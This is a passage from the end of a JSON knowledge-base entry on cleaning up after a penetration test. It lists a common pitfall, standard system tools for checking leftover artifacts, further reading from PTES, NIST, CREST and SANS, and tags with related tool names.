assessment\n- **Incomplete Inventory**: Forgetting to document all artifacts leads to missed cleanup items\n\nTOOLS REFERENCE:\n- **find/grep**: Built-in search tools for artifact verification\n- **ps/netstat**: Process and network connection enumeration\n- **crontab/schtasks**: Scheduled task management\n- **iptables/netsh**: Firewall rule management\n\nFURTHER READING:\n- PTES Post-Exploitation: http://www.pentest-standard.org/index.php/Post_Exploitation\n- NIST SP 800-115 Section 9: Post-Assessment Activities\n- CREST Penetration Testing Guide: https://www.crest-approved.org/\n- SANS Pentesting Best Practices: https://www.sans.org/white-papers/",
      "tags": [
        "post-exploitation",
        "cleanup",
        "pentesting",
        "security-assessment"
      ],
      "related_tools": [
        "windows-exploit-suggester",
        "workflow_cloud_security_assessment",
        "linux-exploit-suggester",
        "aws-sam-cli",
        "linux-smart-enumeration"
      ]
    }
  ]
}